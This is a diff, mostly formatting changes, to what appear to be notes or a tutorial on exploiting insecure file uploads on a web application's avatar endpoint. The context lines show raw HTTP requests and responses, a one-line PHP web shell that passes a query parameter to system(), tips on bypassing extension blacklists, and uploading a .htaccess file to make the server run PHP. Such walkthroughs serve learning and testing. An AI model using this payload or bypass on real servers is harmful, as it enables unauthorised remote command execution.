@@ -88,6 +88,8 @@ the php file and call from other place to try if the folder is allowing the exec
 
 >> SAMPLE:
 
+-REQUEST
+	
 POST /my-account/avatar HTTP/1.1	
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
@@ -117,7 +119,7 @@ Sometimes it is needed to encode the values as sometimes the application harden 
 	
 once the file is uploaded,
 
-RESPONSE
+<b>RESPONSE</b>
 
 HTTP/1.1 200 OK
 Date: Sun, 02 Feb 2025 00:30:25 GMT
@@ -138,7 +140,7 @@ You see the file was successfully uploaded, so, you need to go one folder back t
 Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, 
 .shtml, and so on.
 
->> OVERRIDE SERVER CONFIG
+<b>> OVERRIDE SERVER CONFIG</b>
 
 servers typically won't execute files unless they have been configured to do so. before an Apache server will execute PHP files requested by a client, 
 developers might have to edit /etc/apache2/apache2.conf
@@ -168,7 +170,7 @@ Content-Type: text/php
 ------WebKitFormBoundaryvzIa21H4a0qAp0T0
 Content-Disposition: form-data; name="user"
 
-RESPONSE:
+<b>RESPONSE:</b>
 
 HTTP/1.1 403 Forbidden
 Date: Sun, 02 Feb 2025 01:45:46 GMT
@@ -181,13 +183,13 @@ Content-Length: 164
 
 Sorry, php files are not allowed.
 
->> EXPLOIT
+<b>>> EXPLOIT</b>
 
 the response provide information about the web server you are working on, so you can search for default config files associated to the webserver you
 found. to attempt to force the app to use a different config file, you need to change a couple of parameters on the content disposition of the 
 request.
 
-> FROM
+<b>> FROM</b>
 
 ------WebKitFormBoundaryvzIa21H4a0qAp0T0
 Content-Disposition: form-data; name="avatar"; filename="cumbia.php"
@@ -195,7 +197,7 @@ Content-Type: text/php
 
 &lt;?php echo system($_GET['command']); ?&gt;
 
-> TO
+<b>> TO</b>
 
 ------WebKitFormBoundaryvzIa21H4a0qAp0T0
 Content-Disposition: form-data; name="avatar"; filename=".htaccess"
